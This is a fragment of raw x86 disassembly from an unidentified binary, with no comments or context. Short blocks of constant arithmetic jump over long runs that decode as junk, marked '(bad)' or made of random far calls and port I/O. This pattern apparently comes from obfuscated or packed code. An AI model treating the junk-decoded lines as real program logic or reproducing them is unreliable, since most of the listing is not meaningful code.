  40cb81:	xor    dl,BYTE PTR [edx]
  40cb83:	(bad)  
  40cb84:	push   edi
  40cb85:	mov    WORD PTR [ebp+0x7d],gs
  40cb88:	hlt    
  40cb89:	stos   BYTE PTR es:[edi],al
  40cb8a:	fcmovbe st,st(4)
  40cb8c:	mov    DWORD PTR [edx+0x51e05f7d],esi
  40cb92:	xor    DWORD PTR [ebp-0x4a2eafa1],ecx
  40cb98:	and    al,0x34
  40cb9a:	dec    ecx
  40cb9b:	sub    BYTE PTR [edi],bh
  40cb9d:	sub    ebp,DWORD PTR [ebx-0x4a]
  40cba0:	cmc    
  40cba1:	ins    BYTE PTR es:[edi],dx
  40cba2:	jmp    0x40cb55
  40cba4:	(bad)  
  40cba5:	in     eax,dx
  40cba6:	cli    
  40cba7:	loope  0x40cba7
  40cba9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbaa:	(bad)  
  40cbab:	not    BYTE PTR [ecx+0xb]
  40cbae:	into   
  40cbaf:	push   0x57
  40cbb1:	imul   eax,ebx,0xffffffcb
  40cbb4:	dec    esp
  40cbb5:	loope  0x40cc2b
  40cbb7:	aam    0xb2
  40cbb9:	sbb    ebp,esp
  40cbbb:	xor    eax,0x9148c9ea
  40cbc0:	ss inc esi
  40cbc2:	popf   
  40cbc3:	mov    gs,WORD PTR [ebp+0x50]
  40cbc6:	xchg   esi,eax
  40cbc7:	and    cl,ah
  40cbc9:	pop    eax
  40cbca:	mov    ch,bl
  40cbcc:	push   ss
  40cbcd:	aad    0xf1
  40cbcf:	scas   al,BYTE PTR es:[edi]
  40cbd0:	in     eax,dx
  40cbd1:	lds    esi,FWORD PTR [edi+0xdbedb87]
  40cbd7:	outs   dx,DWORD PTR ds:[esi]
  40cbd8:	sub    BYTE PTR [edi+0x5ce62b8c],0xab
  40cbdf:	jae    0x40cc06
  40cbe5:	mov    eax,DWORD PTR [ebp-0x18]
  40cbe8:	mov    edx,DWORD PTR [ebp-0x14]
  40cbeb:	shrd   eax,edx,0x2
  40cbef:	xor    eax,ecx
  40cbf1:	mov    ecx,DWORD PTR [ebp-0x18]
  40cbf4:	shr    edx,0x2
  40cbf7:	mov    edx,DWORD PTR [ebp-0x14]
  40cbfa:	xor    edx,edx
  40cbfc:	shl    ecx,0x1e
  40cbff:	or     eax,edx
  40cc01:	mov    ds:0x4226c0,eax
  40cc06:	pop    esi
  40cc07:	leave  
  40cc08:	ret    
  40cc09:	push   ebp
  40cc0a:	mov    ebp,esp
  40cc0c:	sub    esp,0x28
  40cc0f:	push   ebx
  40cc10:	push   esi
  40cc11:	push   edi
  40cc12:	mov    DWORD PTR [ebp-0x10],0x67e2
  40cc19:	mov    DWORD PTR [ebp-0x4],0x4726
  40cc20:	mov    DWORD PTR [ebp-0x8],0x580
  40cc27:	mov    DWORD PTR [ebp-0xc],0x5f3e
  40cc2e:	mov    DWORD PTR [ebp-0x28],0x3294
  40cc35:	mov    DWORD PTR [ebp-0x24],0x643
  40cc3c:	mov    DWORD PTR [ebp-0x20],0x2545
  40cc43:	mov    DWORD PTR [ebp-0x1c],0x43ab
  40cc4a:	xor    ebx,ebx
  40cc4c:	inc    ebx
  40cc4d:	mov    DWORD PTR [ebp-0x18],ebx
  40cc50:	mov    DWORD PTR [ebp-0x14],0x76b1
  40cc57:	mov    ecx,DWORD PTR [ebp-0x8]
  40cc5a:	jmp    0x40cf1e
  40cc5f:	sub    edi,ebx
  40cc61:	sti    
  40cc62:	xchg   edi,eax
  40cc63:	sbb    dl,BYTE PTR [edi+0x7d189a1a]
  40cc69:	xor    DWORD PTR [eax-0x4f8e06ec],0x1818edb9
  40cc73:	rcl    BYTE PTR [eax+ebx*1],cl
  40cc76:	sbb    al,dl
  40cc78:	pop    esp
  40cc79:	jno    0x40ccaa
  40cc7b:	mov    esp,0x80e8b9a1
  40cc80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc82:	(bad)  
  40cc83:	jo     0x40cc10
  40cc85:	xchg   edi,eax
  40cc86:	cdq    
  40cc87:	jne    0x40cc92
  40cc89:	mov    cl,0x49
  40cc8b:	mov    ds:0x22a330df,al
  40cc90:	push   0xa33d9925
  40cc95:	mov    edi,0x3aae48fd
  40cc9a:	or     al,BYTE PTR [edi-0x1d]
  40cc9d:	nop
  40cc9e:	sbb    eax,edi
  40cca0:	ret    0x8e7d
  40cca3:	shl    DWORD PTR ds:0xc07fd9cd,0x67
  40ccaa:	push   ebp
  40ccab:	and    al,BYTE PTR [ecx]
  40ccad:	stos   DWORD PTR es:[edi],eax
  40ccae:	fwait
  40ccaf:	pop    ss
  40ccb0:	mov    esi,0x39740e4b
  40ccb5:	mul    dl
  40ccb7:	jae    0x40ccae
  40ccb9:	xor    bl,bh
  40ccbb:	shr    edx,0x15
  40ccbe:	add    bh,ch
  40ccc0:	mov    edi,0x7b62e710
  40ccc5:	jmp    0x40ccbe
  40ccc7:	cmp    DWORD PTR [ebp-0x353fc177],0xdcc3e350
  40ccd1:	iret   
  40ccd2:	push   ebx
  40ccd3:	ins    DWORD PTR es:[edi],dx
  40ccd4:	jle    0x40cc6c
  40ccd6:	sbb    eax,0x3ac5bcaa
  40ccdb:	out    dx,al
  40ccdc:	pop    es
  40ccdd:	sti    
  40ccde:	call   0x8b09b93f
  40cce3:	ds push ebx
  40cce5:	cs mov bl,0x77
  40cce8:	sub    eax,0xc8902772
  40cced:	pusha  
  40ccee:	xor    esi,DWORD PTR [ebp+0x4f1612e2]
  40ccf4:	lock int3 
  40ccf6:	pop    esp
  40ccf7:	push   esi
  40ccf8:	sub    DWORD PTR [ebp+0x60ca32ab],ecx
  40ccfe:	sub    edi,DWORD PTR [ecx+0x1341455]
  40cd04:	sahf   
  40cd05:	data16 icebp 
  40cd07:	stc    
  40cd08:	out    dx,al
  40cd09:	xor    al,0x58
  40cd0b:	pop    esp
  40cd0c:	fwait
  40cd0d:	mov    BYTE PTR [edx-0x1eb217fb],al
  40cd13:	and    al,0xf6
  40cd15:	xor    dl,BYTE PTR [ebx+0x42]
  40cd18:	jae    0x40cce2
  40cd1a:	ds pop ss
  40cd1c:	arpl   ax,bx
  40cd1e:	out    dx,eax
  40cd1f:	imul   esi,edx,0xc298d3a9
  40cd25:	sbb    eax,0x4a8f95de
  40cd2a:	nop
  40cd2b:	mov    esi,0xcce96e30
  40cd30:	ins    BYTE PTR es:[edi],dx
  40cd31:	int    0xb3
  40cd33:	(bad)  
  40cd34:	js     0x40cccd
  40cd36:	cmp    ebp,ebp
  40cd38:	rol    BYTE PTR [ecx+0x2f],1
  40cd3b:	stos   BYTE PTR es:[edi],al
  40cd3c:	push   ds
  40cd3d:	daa    
  40cd3e:	add    al,0x7c
  40cd40:	sub    bl,BYTE PTR [esi+0x3c263532]
  40cd46:	inc    eax
  40cd47:	ja     0x40cdc0
  40cd49:	sbb    DWORD PTR [esi-0x2f0bc09e],eax
  40cd4f:	cmp    BYTE PTR [edx-0x126f7555],0x40
  40cd56:	or     DWORD PTR [edi],eax
  40cd58:	pop    esi
  40cd59:	cdq    
  40cd5a:	jmp    0x40cd43
  40cd5c:	lahf   
  40cd5d:	lods   al,BYTE PTR ds:[esi]
  40cd5e:	push   ss
  40cd5f:	into   
  40cd60:	mov    ah,cl
  40cd62:	dec    esp
  40cd63:	and    DWORD PTR [ebp-0x7375d990],0x32
  40cd6a:	lods   al,BYTE PTR ds:[esi]
  40cd6b:	cmp    ebp,DWORD PTR [esi-0x7a44aba8]
  40cd71:	cs xchg edi,eax
  40cd73:	rcr    cl,1
  40cd75:	push   esi
  40cd76:	and    BYTE PTR [edx+0x2e],0xb2
  40cd7a:	cli    
  40cd7b:	mov    eax,0xc00291f2
  40cd80:	push   ds
  40cd81:	enter  0x899a,0x96
  40cd85:	aas    
  40cd86:	jmp    0x40cd5f
  40cd88:	dec    ecx
  40cd89:	add    al,0x5c
  40cd8b:	push   esp
  40cd8c:	push   ss
  40cd8d:	pop    ss
  40cd8e:	inc    ebp
  40cd8f:	push   cs
  40cd90:	xchg   esp,eax
  40cd91:	cmp    al,BYTE PTR [ecx+0x2f]
  40cd94:	and    DWORD PTR [eax+0x5],0xe78f5690
  40cd9b:	inc    esp
  40cd9c:	in     eax,0x35
  40cd9e:	lahf   
  40cd9f:	jae    0x40cd61
  40cda1:	shl    DWORD PTR [eax+0x77467af1],0xc6
  40cda8:	or     al,0x3c
  40cdaa:	pop    ds
  40cdab:	fidiv  DWORD PTR [ebx+0x73a1aad4]
  40cdb1:	mov    ecx,0xbd48e824
  40cdb6:	inc    eax
  40cdb7:	xchg   BYTE PTR [edi-0x22030930],cl
  40cdbd:	shr    DWORD PTR [esi+edi*2],0xa2
  40cdc1:	call   0x3eef4b62
  40cdc6:	sub    BYTE PTR [ecx],bh
  40cdc8:	(bad)  
  40cdc9:	in     al,dx
  40cdca:	sbb    esi,esi
  40cdcc:	push   edi
  40cdcd:	in     eax,dx
  40cdce:	fisub  DWORD PTR [ecx+0x330c025f]
  40cdd4:	gs mov ah,0xdf
  40cdd7:	pavgw  mm5,mm1
  40cdda:	mov    DWORD PTR [edx-0x7117b4f0],eax
  40cde0:	jle    0x40ce28
  40cde2:	mov    al,ds:0xb3f82004
  40cde7:	ds pop eax
  40cde9:	or     edi,esi
  40cdeb:	cmp    edx,ebp
  40cded:	test   eax,0x19a40c56
  40cdf2:	or     esp,DWORD PTR [edx]
  40cdf4:	repnz repnz outs dx,DWORD PTR ds:[esi]
  40cdf7:	jne    0x40ce64
  40cdf9:	pop    es
  40cdfa:	and    dh,BYTE PTR [esi]
  40cdfc:	add    al,0xe1
  40cdfe:	pop    ecx
  40cdff:	push   0xffffffb0
  40ce01:	lds    edi,FWORD PTR [esp+edi*8-0x42cf4882]
  40ce08:	mov    esi,0xe7dd1dc6
  40ce0d:	push   ds
  40ce0e:	add    DWORD PTR [ebx],0x581cfb1c
  40ce14:	in     eax,dx
  40ce15:	jle    0x40ce02
  40ce17:	push   eax
  40ce18:	adc    dh,BYTE PTR ds:0xad58ea02
  40ce1e:	mov    cl,0x27
  40ce20:	test   al,0x28
  40ce22:	int3   
  40ce23:	fnstenv [esi-0x498f1eae]
  40ce29:	in     eax,dx
  40ce2a:	nop
  40ce2b:	push   es
  40ce2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce2d:	add    eax,DWORD PTR [edi]
  40ce2f:	(bad)  
  40ce30:	lock pop esp
  40ce32:	dec    eax
  40ce33:	sbb    esp,DWORD PTR [eax]
  40ce35:	xchg   ebp,eax
  40ce36:	mov    dl,0xd0
  40ce38:	pushf  
  40ce39:	test   eax,0x3cb32b1a
  40ce3e:	jmp    0x40ce0b
  40ce40:	sbb    DWORD PTR [ecx],0x28
  40ce43:	ja     0x40ce48
  40ce45:	jg     0x40ceb9
  40ce47:	out    dx,eax
  40ce48:	xchg   esi,eax
  40ce49:	ins    BYTE PTR es:[edi],dx
  40ce4a:	outs   dx,DWORD PTR ds:[esi]
  40ce4b:	in     al,0x41
  40ce4d:	jmp    0x63301f14
  40ce52:	inc    ecx
  40ce53:	lahf   
  40ce54:	popa   
  40ce55:	and    eax,0xcb1d6a59
  40ce5a:	cmp    cl,dh
  40ce5c:	jmp    0x8516:0x716c3ed9
  40ce63:	outs   dx,DWORD PTR ds:[esi]
  40ce64:	jne    0x40cec5
  40ce66:	call   DWORD PTR ds:0xe3f9fa6b
  40ce6c:	mov    edx,0x74db892
  40ce71:	xchg   ebp,eax
  40ce72:	push   ecx
  40ce73:	lods   al,BYTE PTR ds:[esi]
  40ce74:	dec    ecx
  40ce75:	mov    bh,0x36
  40ce77:	xchg   edx,eax
  40ce79:	adc    bl,cl
  40ce7b:	jbe    0x40cec0
  40ce7d:	test   DWORD PTR [ecx+edi*8-0x1c2db0e8],esi
  40ce84:	push   0xffffffa8
  40ce86:	mov    BYTE PTR [ebx-0x7a],ch
  40ce89:	imul   esi,eax,0x15
  40ce8c:	and    ch,BYTE PTR [esi]
  40ce8e:	xchg   DWORD PTR [esi+0xd72684b],ebx
  40ce94:	jb     0x40cf15
  40ce96:	push   ecx
  40ce97:	inc    eax
  40ce98:	mov    dl,0xe3
  40ce9a:	cli    
  40ce9b:	popa   
  40ce9c:	push   ds
  40ce9d:	leave  
  40ce9e:	in     eax,dx
  40ce9f:	or     BYTE PTR [edi+0x61d5b712],bl
  40cea5:	or     eax,0x455b762b
  40ceaa:	div    ebx
  40ceac:	jns    0x40cf23
  40ceae:	arpl   sp,bx
  40ceb0:	in     eax,0xc
  40ceb2:	(bad)  
  40ceb3:	xchg   ecx,eax
  40ceb4:	aad    0x50
  40ceb6:	or     BYTE PTR [eax-0xd506629],dl
  40cebc:	or     ch,BYTE PTR [edx+esi*8]
  40cebf:	mov    esi,0xb3aff675
  40cec4:	jp     0x40ceb8
  40cec6:	mov    esp,0x4016a3ff
  40cecb:	pushf  
  40cecc:	or     eax,0x75fa54c9
  40ced1:	jmp    0x40ce72
  40ced3:	(bad)
  40ced7:	and    ah,BYTE PTR [edi]
  40ced9:	jno    0x40ceca
  40cedb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cedc:	in     al,dx
  40cedd:	call   0xc52c:0x6925444b
  40cee4:	cmp    DWORD PTR [esi-0x44],esi
  40cee7:	js     0x40cf22
  40cee9:	sar    BYTE PTR ds:0xd45ab05,cl
  40ceef:	sbb    DWORD PTR [ecx],0xffffff87
  40cef2:	popa   
  40cef3:	loopne 0x40cebc
  40cef5:	sbb    ch,BYTE PTR [ecx+0x53e363ae]
  40cefb:	cmp    al,0x91
  40cefd:	mov    ebp,0x8b5a7d7b
  40cf02:	xor    DWORD PTR [ebx-0x3a323804],ebp
  40cf08:	pop    eax
  40cf09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf0a:	loop   0x40cf3d
  40cf0c:	not    DWORD PTR [esi+0x9]
  40cf0f:	pop    ss
  40cf10:	inc    esp
  40cf11:	push   0xffffffe4
  40cf13:	loopne 0x40cef7
  40cf15:	and    bl,dh
  40cf17:	push   ds
  40cf18:	push   ebx
  40cf19:	dec    ebp
  40cf1a:	(bad)  
  40cf1b:	mov    esp,0x458bfa4b
  40cf20:	cld    
  40cf21:	sub    ecx,eax
  40cf23:	add    ecx,DWORD PTR [ebp-0xc]
  40cf26:	add    ecx,DWORD PTR [ebp-0x10]
  40cf29:	imul   ecx,ecx,0x1f80
  40cf2f:	add    ecx,0x727e
  40cf35:	xor    ecx,0x106c92f2
  40cf3b:	mov    DWORD PTR [ebp-0x8],0x113c
  40cf42:	mov    DWORD PTR [ebp-0xc],0x3d61
  40cf49:	mov    DWORD PTR [ebp-0x10],0x16e9
  40cf50:	mov    DWORD PTR [ebp-0x4],0x21aa
  40cf57:	mov    eax,DWORD PTR [ebp-0x10]
  40cf5a:	or     eax,0x3611
  40cf5f:	add    eax,DWORD PTR [ebp-0xc]
  40cf62:	mov    edx,DWORD PTR [ebp-0x8]
  40cf65:	and    eax,edx
  40cf67:	mov    edx,ecx
  40cf69:	sub    edx,eax
  40cf6b:	mov    eax,DWORD PTR [ebp-0x4]
  40cf6e:	mov    esi,DWORD PTR ds:0x4225b8
  40cf74:	mov    esi,DWORD PTR [esi+0x1cc]
  40cf7a:	add    eax,0x6772
  40cf7f:	or     eax,0x1f24
  40cf84:	sub    eax,0x7046
  40cf89:	xor    eax,0x497a
  40cf8e:	sub    esi,eax
  40cf90:	mov    eax,DWORD PTR [ebp+0x8]
  40cf93:	mov    al,BYTE PTR [edx+eax*1-0x5774]
  40cf9a:	jmp    0x40d25e
  40cf9f:	nop
  40cfa0:	xchg   ebx,eax
  40cfa1:	retf   
  40cfa2:	ja     0x40cf6e
  40cfa4:	das    
  40cfa5:	sub    al,0x6a
  40cfa7:	sbb    DWORD PTR [esi-0x3a36432d],esi
  40cfad:	adc    al,0xaa
  40cfaf:	jb     0x40cf99
  40cfb1:	sbb    BYTE PTR [eax],bl
  40cfb3:	rcl    BYTE PTR [eax+ebx*1],cl
  40cfb6:	sbb    BYTE PTR [eax],al
  40cfb8:	lods   eax,DWORD PTR ds:[esi]
  40cfb9:	cld    
  40cfba:	sub    DWORD PTR [ebx+0x46bc855a],edx
  40cfc0:	and    DWORD PTR [edx+0x6c5c6561],edi
  40cfc6:	or     al,dh
  40cfc8:	sbb    edi,DWORD PTR [edx+0x286c2762]
  40cfce:	cmp    BYTE PTR [edx+0x523c48fa],ch
  40cfd4:	stos   DWORD PTR es:[edi],eax
  40cfd5:	inc    esp
  40cfd6:	(bad)  
  40cfd7:	mov    esi,0xf97f89f4
  40cfdc:	loope  0x40cfc2
  40cfde:	push   eax
  40cfdf:	lock pop ss
  40cfe1:	mov    esp,0xdfc75868
  40cfe6:	cmp    esp,DWORD PTR [edi+ecx*4-0x1ce9e9a1]
  40cfed:	scas   eax,DWORD PTR es:[edi]
  40cfee:	cld    
  40cfef:	mov    DWORD PTR [ecx+eiz*1],edx
  40cff2:	mov    edi,0xf70cd55d
  40cff7:	cmp    bh,al
  40cff9:	pop    es
  40cffa:	pop    ebx
  40cffb:	sub    al,0x4a
  40cffd:	iret   
  40cffe:	fwait
  40cfff:	push   esp
  40d000:	jo     0x40cffd
  40d002:	sahf   
  40d003:	je     0x40d078
  40d005:	or     DWORD PTR [ecx-0x642e90e0],ebp
  40d00b:	push   0xbf5cc2ca
  40d010:	push   eax
  40d011:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d012:	cs inc ecx
  40d014:	cmp    ch,BYTE PTR [esi-0x22]
  40d017:	or     DWORD PTR [ebx],edx
  40d019:	sub    edi,DWORD PTR [edx+0x320336a0]
  40d01f:	and    eax,0xa11a409a
  40d024:	lods   al,BYTE PTR ds:[esi]
  40d025:	sub    cl,ch
  40d027:	aam    0xa4
  40d029:	retf   
  40d02a:	(bad)  
  40d02c:	cmp    DWORD PTR [eax+0x1267869a],ebx
  40d032:	ins    DWORD PTR es:[edi],dx
  40d033:	mov    ds:0x2f960566,eax
  40d038:	das    
  40d039:	hlt    
  40d03a:	ret    0xe448
  40d03d:	push   eax
  40d03e:	(bad)  
  40d03f:	std    
  40d040:	jmp    0x40d07a
  40d042:	mov    bl,0xa3
  40d044:	and    esi,edi
  40d046:	mov    edi,0xd8b3428b
  40d04b:	cwde   
  40d04c:	mov    dl,0x8a
  40d04e:	add    BYTE PTR [ecx],0x58
  40d051:	repnz sub esp,DWORD PTR [ecx+0x20baa014]
  40d058:	ret    
  40d059:	mov    ds:0x5e2a25ca,eax
  40d05e:	and    edx,ecx
  40d060:	push   esp
  40d061:	or     eax,0x61f63f9b
  40d066:	pop    ecx
  40d067:	mov    edi,0x629a9b32
  40d06c:	in     eax,0xdb
  40d06e:	add    al,BYTE PTR [edx]
  40d070:	int3   
  40d071:	stos   DWORD PTR es:[edi],eax
  40d072:	fistp  WORD PTR [eax]
  40d074:	aad    0xf6
  40d076:	inc    ecx
  40d077:	jmp    0x55f76799
  40d07c:	shl    cl,1
  40d07e:	jns    0x40d0a9
  40d080:	push   ebx
  40d081:	xor    bh,ah
  40d083:	cmp    eax,0xbfb5e94a
  40d088:	shr    cl,1
  40d08a:	ret    
  40d08b:	jl     0x40d00e
  40d08d:	push   ebp
  40d08e:	mov    eax,ds:0xcbec780c
  40d093:	mov    dl,0x5d
  40d095:	or     eax,DWORD PTR [ebx-0x3b]
  40d098:	sbb    al,bl
  40d09a:	mov    cl,0x31
  40d09c:	sbb    ebx,edx
  40d09e:	or     dh,BYTE PTR [eax+0x35e06260]
  40d0a4:	add    esi,DWORD PTR [ecx]
  40d0a6:	fstp   TBYTE PTR [ecx]
  40d0a8:	mov    ebp,0xcf1ac71c
  40d0ad:	loop   0x40d04b
  40d0af:	or     DWORD PTR [eax-0x1f0dbc0c],0xffffffbb
  40d0b6:	jno    0x40d0f3
  40d0b8:	push   edi
  40d0b9:	jbe    0x40d083
  40d0bb:	sbb    ebp,0x581cc78c
  40d0c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0c2:	push   0xffffffae
  40d0c4:	add    ah,BYTE PTR [eax+ebx*8-0x7e56f990]
  40d0cb:	mov    ds:0xbaefa7d2,eax
  40d0d0:	repnz cmp edi,DWORD PTR [edx]
  40d0d3:	push   ecx
  40d0d4:	mov    ds:0xc55ba99c,al
  40d0d9:	dec    esi
  40d0da:	das    
  40d0db:	mov    cl,0x8f
  40d0dd:	xchg   esi,eax
  40d0de:	es mov ebp,0xde14dbe4
  40d0e4:	iret   
  40d0e5:	mov    DWORD PTR [edx+0x25],edx
  40d0e8:	jnp    0x40d098
  40d0ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0eb:	daa    
  40d0ec:	xchg   ebp,eax
  40d0ed:	push   edx
  40d0ee:	mov    bh,BYTE PTR [edx]
  40d0f0:	push   ecx
  40d0f1:	add    edi,DWORD PTR [ebx]
  40d0f3:	test   BYTE PTR [esi+0x43],bl
  40d0f6:	pop    ecx
  40d0f7:	xor    al,BYTE PTR [esi+0x1fa42ad2]
  40d0fd:	jg     0x40d0e3
  40d0ff:	retf   
  40d100:	xor    eax,0xd990fed7
  40d105:	or     eax,0x50255758
  40d10a:	push   esp
  40d10b:	push   ebx
  40d10c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d10d:	fadd   DWORD PTR [esi-0x7c]
  40d110:	jmp    0x40d13b
  40d112:	mov    ecx,0xa815b670
  40d117:	push   ds
  40d118:	int    0xc7
  40d11a:	mov    dh,BYTE PTR [esi+0x4e]
  40d11d:	jno    0x40d17b
  40d11f:	lock (bad) 
  40d121:	dec    esp
  40d122:	pop    esp
  40d123:	xlat   BYTE PTR ds:[ebx]
  40d124:	adc    ebx,DWORD PTR [edx-0x4d5d4fad]
  40d12a:	arpl   WORD PTR [esi-0x23cdd250],ax
  40d130:	int    0x6b
  40d132:	leave  
  40d133:	inc    edx
  40d134:	mov    cl,0x25
  40d136:	push   0xf9afa9c9
  40d13b:	xchg   ah,dl
  40d13d:	xor    DWORD PTR [ebx+0x2d],eax
  40d140:	call   0x4a091e10
  40d145:	sbb    ebp,DWORD PTR [ecx]
  40d147:	pop    edx
  40d148:	xchg   ebx,eax
  40d149:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d14a:	popf   
  40d14b:	mov    cl,0x8a
  40d14d:	jae    0x40d148
  40d14f:	mov    ds:0x13bdc9de,al
  40d154:	sbb    al,0xf5
  40d156:	mov    dl,0x6a
  40d158:	je     0x40d11f
  40d15a:	jne    0x40d110
  40d15c:	js     0x40d14e
  40d15e:	in     al,0x9b
  40d160:	icebp  
  40d161:	push   esi
  40d162:	push   ds
  40d163:	call   FWORD PTR [ebx+0x3ca9d84b]
  40d169:	out    dx,eax
  40d16a:	cld    
  40d16b:	jnp    0x40d118
  40d16d:	stc    
  40d16e:	sbb    DWORD PTR [ecx-0x8],ebp
  40d171:	test   DWORD PTR [edi+0x57],ebp
  40d174:	cmp    al,0xe2
  40d176:	loop   0x40d1e8
  40d178:	or     eax,0xdac5dc2c
  40d17d:	imul   edx,DWORD PTR [esi+0x23f8964b],0x6d54f5b5
  40d187:	mov    al,0x9c
  40d189:	sbb    DWORD PTR [esi+0x5a],eax
  40d18c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d18d:	sbb    al,0xaf
  40d18f:	int3   
  40d190:	int3   
  40d191:	sub    DWORD PTR [esi],ebx
  40d193:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d194:	cli    
  40d195:	mov    eax,ds:0x30a8f981
  40d19a:	add    esp,ebp
  40d19c:	xchg   esp,eax
  40d19d:	add    DWORD PTR [edx+0xb5e755e],0x48
  40d1a4:	dec    edx
  40d1a5:	xor    esi,DWORD PTR ds:0x9cc6d8bd
  40d1ab:	out    0x5f,eax
  40d1ad:	mov    es,esp
  40d1af:	adc    BYTE PTR [ecx+0x5ab2ce7b],cl
  40d1b5:	loopne 0x40d13b
  40d1b7:	or     al,0xa0
  40d1b9:	mov    edx,0x5e78c7f3
  40d1be:	mov    ds:0x6f953e6b,eax
  40d1c3:	push   0x16e794dd
  40d1c8:	arpl   WORD PTR [edx+0x7],dx
  40d1cb:	call   0x5d3b:0xacf5c0fe
  40d1d2:	aaa    
  40d1d3:	test   al,0x3a
  40d1d5:	cs daa 
  40d1d7:	sbb    eax,0x6d5f48c0
  40d1dc:	dec    ebp
  40d1dd:	fadd   QWORD PTR [ebp+0x587d63a2]
  40d1e3:	aaa    
  40d1e4:	push   ebp
  40d1e5:	call   0x257c:0x3df2453b
  40d1ec:	jo     0x40d1be
  40d1ee:	pop    ebx
  40d1ef:	fbstp  TBYTE PTR [esi-0x57]
  40d1f2:	call   0xf8c:0xe42b8c37
  40d1f9:	inc    eax
  40d1fa:	jg     0x40d1b8
  40d1fc:	xchg   ebp,eax
  40d1fd:	lock (bad) 
  40d1ff:	cmp    cl,dh
  40d201:	fwait
  40d202:	rol    DWORD PTR [edx-0x4c89dff4],cl
  40d208:	pop    esp
  40d209:	sbb    BYTE PTR [ebx],bh
  40d20b:	cld    
  40d20c:	(bad)  
  40d20d:	adc    ebx,esp
  40d20f:	xchg   edi,eax
  40d210:	seto   BYTE PTR [edi]
  40d213:	add    ebx,edx
  40d215:	jb     0x40d20b
  40d217:	shl    DWORD PTR [ebx-0x791c823c],cl
  40d21d:	xchg   DWORD PTR [edi+0x7f303bb9],ebx
  40d223:	sahf   
  40d224:	push   edi
  40d225:	outs   dx,BYTE PTR ds:[esi]
  40d226:	hlt    
  40d227:	movaps XMMWORD PTR [ebx],xmm4
  40d22a:	jae    0x40d1dd
  40d22c:	sub    edi,DWORD PTR [ecx+0x56]
  40d22f:	and    dh,BYTE PTR [edx]
  40d231:	test   DWORD PTR [edx+edi*1-0x4015ba32],ebp
  40d238:	pop    ebx
  40d239:	ss mov ah,0x31
  40d23c:	sub    bl,BYTE PTR [edi-0x6226cf30]
  40d242:	fucomi st,st(0)
  40d244:	shl    ebp,0x9d
  40d247:	jo     0x40d227
  40d249:	lods   eax,DWORD PTR ds:[esi]
  40d24a:	mov    BYTE PTR [ebp+0x57],ch
  40d24d:	sub    eax,esi
  40d24f:	add    edx,DWORD PTR [ebx-0x6b7e1d9f]
  40d255:	push   esi
  40d256:	mov    dl,0x8b
  40d258:	xor    edi,edi
  40d25a:	stos   BYTE PTR es:[edi],al
  40d25b:	sub    eax,0x4885020
  40d260:	push   cs
  40d261:	mov    eax,DWORD PTR [ebp-0x14]
  40d264:	mov    esi,DWORD PTR [ebp-0x18]
  40d267:	and    eax,0x2389
  40d26c:	xor    eax,0x695
  40d271:	xor    edx,edx
  40d273:	div    esi
  40d275:	lea    ecx,[ecx+eax*1-0x2413]
  40d27c:	mov    eax,DWORD PTR [ebp-0x1c]
  40d27f:	add    eax,DWORD PTR [ebp-0x20]
  40d282:	mov    edx,DWORD PTR [ebp-0x24]
  40d285:	and    eax,edx
  40d287:	mov    edx,DWORD PTR [ebp-0x28]
  40d28a:	imul   eax,edx
  40d28d:	mov    edx,0xd0c8f
  40d292:	sub    edx,eax
  40d294:	cmp    ecx,edx
  40d296:	jbe    0x40cf3b
  40d29c:	push   0x2
  40d29e:	pop    eax
  40d29f:	mov    DWORD PTR [ebp-0x1c],eax
  40d2a2:	mov    DWORD PTR [ebp-0x20],ebx
  40d2a5:	mov    DWORD PTR [ebp-0x24],0x5
  40d2ac:	mov    DWORD PTR [ebp-0x28],0x6686
  40d2b3:	mov    DWORD PTR [ebp-0x8],0x7cf1
  40d2ba:	mov    DWORD PTR [ebp-0x4],eax
  40d2bd:	mov    DWORD PTR [ebp+0x8],0x739a
  40d2c4:	mov    DWORD PTR [ebp-0xc],0xf3a
  40d2cb:	xor    edx,edx
  40d2cd:	mov    DWORD PTR [ebp-0x10],0x429
  40d2d4:	mov    eax,DWORD PTR [ebp-0x28]
  40d2d7:	mov    ecx,DWORD PTR [ebp-0x24]
  40d2da:	sub    eax,0x175c
  40d2df:	div    ecx
  40d2e1:	jmp    0x40d5a5
  40d2e6:	test   DWORD PTR [esi],esi
  40d2e8:	push   eax
  40d2e9:	inc    edx
  40d2ea:	sbb    bl,BYTE PTR [edx]
  40d2ec:	jnp    0x40d324
  40d2ee:	inc    esp
  40d2ef:	sbb    DWORD PTR [edi+0x7c],esi
  40d2f2:	adc    ah,cl
  40d2f4:	inc    ebp
  40d2f5:	push   0x2d
  40d2f7:	loop   0x40d311
  40d2f9:	sbb    dl,dl
  40d2fb:	adc    al,0x18
  40d2fd:	sbb    BYTE PTR [esi-0x31d93ff4],bl
  40d303:	cmp    bh,BYTE PTR [ebp-0x70]
  40d306:	mov    esp,0xfa13575e
  40d30b:	xchg   ebx,eax
  40d30c:	(bad)  
  40d30d:	xchg   ebp,eax
  40d30e:	pusha  
  40d30f:	pop    ebp
  40d310:	and    eax,0xb85a47b2
  40d315:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d316:	rol    BYTE PTR [ecx-0x2989ff81],cl
  40d31c:	or     eax,0x3861560e
  40d321:	dec    esi
  40d322:	xor    ecx,ebx
  40d324:	push   edx
  40d325:	pop    esi
  40d326:	mov    bl,0xcc
  40d328:	adc    DWORD PTR [eax-0x63],ebp
  40d32b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d32c:	adc    ebp,ecx
  40d32e:	ret    0x887a
  40d331:	aad    0xfb
  40d333:	jo     0x40d370
  40d335:	mov    edx,0xa9de73cd
  40d33a:	mov    ebp,0x26711b7f
  40d33f:	xor    bl,BYTE PTR [edi+0x17]
  40d342:	in     al,0x2f
  40d344:	cmp    DWORD PTR es:[eax+0x41f6b23b],edi
